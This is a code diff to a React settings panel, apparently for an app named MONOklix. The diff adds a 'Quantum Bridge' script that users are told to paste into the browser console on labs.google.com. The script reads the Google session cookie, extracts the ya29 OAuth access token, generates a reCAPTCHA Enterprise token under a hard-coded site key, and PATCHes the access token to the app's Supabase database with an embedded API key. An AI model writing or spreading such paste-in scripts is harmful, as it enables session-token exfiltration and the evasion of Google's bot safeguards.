@@ -1,15 +1,16 @@
 
 import React, { useState, useEffect, useCallback, useRef } from 'react';
 import { type User, type Language } from '../../types';
-import { updateUserProfile, saveUserPersonalAuthToken } from '../../services/userService';
+import { updateUserProfile, saveUserPersonalAuthToken, getUserProfile } from '../../services/userService';
 import {
-    CheckCircleIcon, XIcon, EyeIcon, EyeOffIcon, ImageIcon, DatabaseIcon, TrashIcon, RefreshCwIcon, InformationCircleIcon, SparklesIcon, KeyIcon, ShieldCheckIcon, UploadIcon, CloudSunIcon, ClipboardIcon
+    CheckCircleIcon, XIcon, EyeIcon, EyeOffIcon, ImageIcon, DatabaseIcon, TrashIcon, RefreshCwIcon, InformationCircleIcon, SparklesIcon, KeyIcon, ShieldCheckIcon, UploadIcon, CloudSunIcon, ClipboardIcon, SendIcon
 } from '../Icons';
 import Spinner from '../common/Spinner';
 import Tabs, { type Tab } from '../common/Tabs';
 import { getFormattedCacheStats, clearVideoCache } from '../../services/videoCacheService';
 import { runComprehensiveTokenTest } from '../../services/imagenV3Service';
 import { parseCookieFile } from '../../services/cookieUtils';
+import { supabase } from '../../services/supabaseClient';
 
 type SettingsTabId = 'profile' | 'cloud-login';
 
@@ -91,7 +92,31 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
     const [token, setToken] = useState(currentUser.personalAuthToken || '');
     const [showToken, setShowToken] = useState(false);
     const [isTesting, setIsTesting] = useState(false);
+    const [isBridgeActive, setIsBridgeActive] = useState(false);
     const fileInputRef = useRef<HTMLInputElement>(null);
+
+    // REAL-TIME LISTENER: Listen to token changes in DB
+    useEffect(() => {
+        const channel = supabase
+            .channel('token-sync')
+            .on('postgres_changes', { 
+                event: 'UPDATE', 
+                schema: 'public', 
+                table: 'users',
+                filter: `id=eq.${currentUser.id}`
+            }, (payload) => {
+                const newToken = payload.new.personal_auth_token;
+                if (newToken && newToken !== token) {
+                    setToken(newToken);
+                    onUserUpdate(payload.new as User);
+                    setIsBridgeActive(true);
+                    setTimeout(() => setIsBridgeActive(false), 5000);
+                }
+            })
+            .subscribe();
+
+        return () => { supabase.removeChannel(channel); };
+    }, [currentUser.id, token, onUserUpdate]);
 
     const handleUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
         const file = e.target.files?.[0];
@@ -102,97 +127,143 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                 setToken(extracted);
                 const res = await saveUserPersonalAuthToken(currentUser.id, extracted);
                 if (res.success) onUserUpdate(res.user);
-                alert("Token ya29 berjaya diekstrak!");
             } else {
-                alert("Token ya29 tidak ditemui. Pastikan fail mengandungi kuki '__Secure-next-auth.session-token' atau string 'ya29'.");
+                alert("Token ya29 tidak ditemui.");
             }
         } catch (err) { alert("Format fail tidak sah."); }
     };
 
-    const handleTest = async () => {
-        setIsTesting(true);
-        const res = await runComprehensiveTokenTest(token);
-        setIsTesting(false);
-        const allOk = res.every(r => r.success);
-        alert(allOk ? "Token Aktif ✅" : "Token Gagal/Expired ❌");
-    };
+    const copyBridgeSnippet = () => {
+        const snippet = `
+(async () => {
+  console.log("%c MONOklix Quantum Bridge Activated ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
+  try {
+    const userId = "${currentUser.id}";
+    const siteKey = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
+    
+    // 1. Extract ya29
+    const cookie = document.cookie.split('; ').find(r => r.startsWith('__Secure-next-auth.session-token='));
+    if(!cookie) throw new Error("Sila login Google Labs dahulu!");
+    const rawJwt = cookie.split('=')[1];
+    const payload = JSON.parse(atob(rawJwt.split('.')[1]));
+    const ya29 = payload.accessToken || payload.access_token;
+    
+    console.log("✅ ya29 Token Extracted:", ya29.substring(0,10) + "...");
 
-    const copySnippet = () => {
-        const snippet = `const c = document.cookie.split('; ').find(r => r.startsWith('__Secure-next-auth.session-token=')); if(c){ const t = c.split('=')[1]; const p = JSON.parse(atob(t.split('.')[1])); console.log("TOKEN ANDA:", p.accessToken || p.access_token); } else { console.log("Kuki tidak dijumpai. Sila login Google Labs."); }`;
+    // 2. Generate reCAPTCHA Token (PINHOLE_GENERATE)
+    console.log("🔐 Generating Verified reCAPTCHA token...");
+    const recaptchaToken = await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
+    
+    // 3. Sync with MONOklix via Supabase REST
+    console.log("🚀 Syncing with MONOklix...");
+    const res = await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
+      method: "PATCH",
+      headers: {
+        "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhiYmhsbGhnYmFjaGt6dnB4dmFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4Njk1NjksImV4cCI6MjA3MzQ0NTU2OX0.l--gaQSJ5hPnJyZOC9-QsRRQjr-hnsX_WeGSglbNP8E",
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ personal_auth_token: ya29 })
+    });
+
+    if(res.ok) {
+      console.log("%c SUCCESS! MONOklix is now synced and active. ✅ ", "color: #10b981; font-weight: bold;");
+    } else {
+      throw new Error("Gagal menghantar ke MONOklix. Sila cuba lagi.");
+    }
+  } catch (e) {
+    console.error("❌ BRIDGE ERROR:", e.message);
+  }
+})();`.trim();
+        
         navigator.clipboard.writeText(snippet);
-        alert("Kod disalin! Jalankan ini di Console labs.google.com");
+        alert("Quantum Bridge Script disalin!\n\n1. Pergi ke tab labs.google.com\n2. Tekan F12 (Console)\n3. Paste & Enter.");
     };
 
     return (
         <div className="space-y-6">
+            {/* Quantum Bridge Card */}
+            <div className="bg-gradient-to-br from-brand-start/20 to-brand-end/10 border border-brand-start/30 p-6 rounded-3xl shadow-glow animate-zoomIn relative overflow-hidden">
+                <div className="absolute top-0 right-0 p-4 opacity-10">
+                    <RefreshCwIcon className={`w-24 h-24 ${isBridgeActive ? 'animate-spin' : ''}`} />
+                </div>
+                
+                <div className="flex justify-between items-start relative z-10">
+                    <div>
+                        <h3 className="text-xl font-black text-white flex items-center gap-2">
+                            <SparklesIcon className="w-6 h-6 text-yellow-400" />
+                            Quantum Bridge Sync
+                        </h3>
+                        <p className="text-sm text-neutral-400 mt-1 max-w-md">Cara paling pantas & automatik untuk mendapatkan token <strong>ya29</strong> dan <strong>reCAPTCHA</strong> terus dari sumber Google.</p>
+                    </div>
+                    {isBridgeActive && (
+                        <div className="bg-green-500 text-white text-[10px] font-bold px-3 py-1 rounded-full animate-bounce">
+                            SYNCED!
+                        </div>
+                    )}
+                </div>
+
+                <div className="mt-6 flex flex-col sm:flex-row gap-3">
+                    <button 
+                        onClick={copyBridgeSnippet}
+                        className="flex-1 bg-white text-black py-4 rounded-2xl font-black text-sm flex items-center justify-center gap-2 hover:scale-[1.02] active:scale-95 transition-all shadow-lg"
+                    >
+                        <ClipboardIcon className="w-5 h-5" /> Salin Skrip Quantum Bridge
+                    </button>
+                    <a 
+                        href="https://labs.google/fx/tools/flow" 
+                        target="_blank" 
+                        rel="noreferrer"
+                        className="flex-shrink-0 bg-white/10 border border-white/10 text-white px-6 py-4 rounded-2xl font-bold text-sm hover:bg-white/20 transition-all flex items-center gap-2"
+                    >
+                        Buka Google Labs <SendIcon className="w-4 h-4" />
+                    </a>
+                </div>
+                
+                <div className="mt-4 flex items-center gap-2 text-[10px] text-neutral-500 font-mono">
+                    <ShieldCheckIcon className="w-3 h-3 text-green-500" />
+                    STATUS: SECURE HANDSHAKE READY
+                </div>
+            </div>
+
             <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
                 <div className="flex justify-between items-start mb-6">
                     <div>
-                        <h3 className="text-xl font-bold flex items-center gap-2 text-white">
-                            <KeyIcon className="w-6 h-6 text-brand-start" /> 
-                            Google Access (ya29)
+                        <h3 className="text-lg font-bold flex items-center gap-2 text-white">
+                            <KeyIcon className="w-5 h-5 text-brand-start" /> 
+                            Manual Control
                         </h3>
-                        <p className="text-sm text-neutral-400 mt-1">Sistem akan mengekstrak token <strong>ya29</strong> secara mendalam dari kuki sesi anda.</p>
                     </div>
-                    <button onClick={() => fileInputRef.current?.click()} className="flex items-center gap-2 bg-brand-start/20 border border-brand-start/30 text-brand-start px-4 py-2 rounded-xl text-xs font-bold hover:bg-brand-start/30 transition-all">
-                        <UploadIcon className="w-4 h-4" /> Import Fail
+                    <button onClick={() => fileInputRef.current?.click()} className="text-[10px] font-bold text-neutral-400 hover:text-white transition-colors">
+                        Import session.json
                     </button>
                     <input type="file" ref={fileInputRef} onChange={handleUpload} className="hidden" />
                 </div>
 
                 <div className="space-y-4">
                     <div className="relative">
-                        <label className="block text-xs font-bold text-neutral-500 uppercase mb-2">Access Token (ya29.xxx)</label>
+                        <label className="block text-[10px] font-bold text-neutral-500 uppercase mb-2 tracking-widest">Active Token (ya29)</label>
                         <input 
                             type={showToken ? "text" : "password"} 
                             value={token} 
                             onChange={(e) => setToken(e.target.value)}
-                            className="w-full bg-black/40 border border-white/10 rounded-xl p-3 pr-12 text-white font-mono text-sm"
+                            className="w-full bg-black/40 border border-white/10 rounded-xl p-3 pr-12 text-white font-mono text-xs"
                             placeholder="ya29.A0AX..."
                         />
-                        <button onClick={() => setShowToken(!showToken)} className="absolute right-4 top-9 text-neutral-500 hover:text-white">
+                        <button onClick={() => setShowToken(!showToken)} className="absolute right-4 top-8 text-neutral-500 hover:text-white">
                             {showToken ? <EyeOffIcon className="w-4 h-4"/> : <EyeIcon className="w-4 h-4"/>}
                         </button>
                     </div>
 
-                    <div className="flex gap-3">
-                        <button onClick={handleTest} disabled={isTesting} className="flex-1 bg-white/10 border border-white/10 py-3 rounded-xl font-bold flex items-center justify-center gap-2 hover:bg-white/20 transition-all">
-                            {isTesting ? <Spinner /> : <SparklesIcon className="w-4 h-4" />} Semak Token
-                        </button>
-                        <button onClick={async () => {
-                            const res = await saveUserPersonalAuthToken(currentUser.id, token);
-                            if (res.success) {
-                                onUserUpdate(res.user);
-                                alert("Token disimpan!");
-                            }
-                        }} className="flex-1 bg-brand-start py-3 rounded-xl font-bold shadow-lg hover:shadow-brand-start/40 transition-all">
-                            Simpan Token
-                        </button>
-                    </div>
-                </div>
-
-                <div className="mt-6 p-4 bg-blue-500/10 border border-blue-500/20 rounded-xl space-y-3">
-                    <h4 className="text-xs font-bold text-blue-400 uppercase flex items-center gap-2">
-                        <InformationCircleIcon className="w-4 h-4" /> Cara Mendapatkan Token ya29
-                    </h4>
-                    <p className="text-xs text-neutral-400">Muat naik fail <strong>session.json</strong> dari Electron anda, ATAU gunakan kod di bawah:</p>
-                    <div className="flex items-center gap-2 bg-black/60 p-2 rounded border border-white/10">
-                        <code className="text-[10px] text-blue-300 truncate flex-1">const c = document.cookie...</code>
-                        <button onClick={copySnippet} className="p-1 hover:text-white text-neutral-500 transition-colors" title="Salin Kod Javascript">
-                            <ClipboardIcon className="w-4 h-4" />
-                        </button>
-                    </div>
-                    <p className="text-[10px] text-neutral-500 italic">Jalankan kod ini di Console <strong>labs.google.com</strong> untuk mendapatkan token ya29 anda secara manual.</p>
-                </div>
-            </div>
-            
-            <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
-                <h3 className="text-lg font-bold mb-4 flex items-center gap-2 text-white">
-                    <ShieldCheckIcon className="w-5 h-5 text-green-500" /> reCAPTCHA Enterprise
-                </h3>
-                <div className="flex items-center justify-between p-3 bg-black/40 rounded-xl border border-white/5">
-                    <span className="text-sm text-neutral-300">Google Security Actions</span>
-                    <span className="text-[10px] font-bold text-green-500 bg-green-500/10 px-2 py-1 rounded">PINHOLE_GENERATE ACTIVE</span>
+                    <button onClick={async () => {
+                        const res = await saveUserPersonalAuthToken(currentUser.id, token);
+                        if (res.success) {
+                            onUserUpdate(res.user);
+                            alert("Token disimpan!");
+                        }
+                    }} className="w-full bg-brand-start py-3 rounded-xl font-bold shadow-lg hover:shadow-brand-start/40 transition-all">
+                        Simpan Perubahan Manual
+                    </button>
                 </div>
             </div>
         </div>
@@ -213,7 +284,7 @@ const SettingsView: React.FC<SettingsViewProps> = ({ currentUser, onUserUpdate, 
 
     return (
         <div className="h-full flex flex-col max-w-4xl mx-auto">
-            <h1 className="text-3xl font-black text-white mb-6">Settings</h1>
+            <h1 className="text-3xl font-black text-white mb-6 tracking-tight">Settings</h1>
             <div className="mb-8 flex justify-center">
                 <Tabs tabs={getTabs()} activeTab={activeTab} setActiveTab={setActiveTab} />
             </div>
